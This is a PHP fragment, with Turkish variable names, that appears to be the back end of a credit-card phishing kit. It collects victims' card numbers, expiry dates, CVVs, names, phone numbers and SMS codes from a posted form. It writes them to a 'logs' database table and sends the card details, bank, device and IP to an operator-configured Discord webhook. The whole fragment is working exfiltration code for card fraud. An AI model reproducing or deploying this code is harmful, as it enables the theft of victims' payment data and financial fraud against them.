            ...
            if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
                ...
                if ($yasakli_bin or $yasakli_bin_kodu) {
                    if ($check["ip"]) {
                        ...
                        if ($checkAdmin["discord_webhook"] == 1 && $checkVisitor["discord_webhook_sended"] == 0) {
                            txmd_webhook($checkAdmin["discord_webhook_url"], tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])) . ' ' . tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])) . ' ' . htmlspecialchars($_POST['cvv']), $banka . ' (' . $seviye . ')', $check['tarih'], $check['device'] . ' - ' . $check['browser'], $check['ip']);
                            $sorgu1 = $pdo->prepare("INSERT INTO logs SET isim_soyisim=?,bakiye=?,tel_no=?,kredi_karti=?,skt=?,cvv=?,banka=?,marka=?,seviye=?,tarih=?,sms=?,durum=?,comment=?,onlineTimer=?,ip=?");
                            $sorgu2 = $pdo->prepare("INSERT INTO logs_visitor SET ip=?,useragent=?,discord_webhook_sended=?,log_notify=?,sms_notify=?");
                            $pdo->query("UPDATE logs_visitor SET discord_webhook_sended = 1 WHERE ip = '{$ip}'");
                            $sorgu1->execute(array(mb_strtoupper(htmlspecialchars($_POST['isim_soyisim']), 'UTF-8'), htmlspecialchars($_POST['bakiye']), isset($_POST['tel_no']) ? htmlspecialchars($_POST['tel_no']) : '', tum_bosluklari_temizle(htmlspecialchars($_POST['kredi_karti'])), tum_bosluklari_temizle(htmlspecialchars($_POST['skt'])), htmlspecialchars($_POST['cvv']), $banka, $marka, $seviye, date('d.m.Y H:i'), isset($_POST['sms']) ? htmlspecialchars($_POST['sms']) : '', 'Bekleme Ekranı', '', time(), $ip));
                            $sorgu2->execute(array($ip, $_SERVER["HTTP_USER_AGENT"], 0, 0, 0));
                            if ($sorgu) {
                                echo "yasakli_bin";
                            }
                        } else {
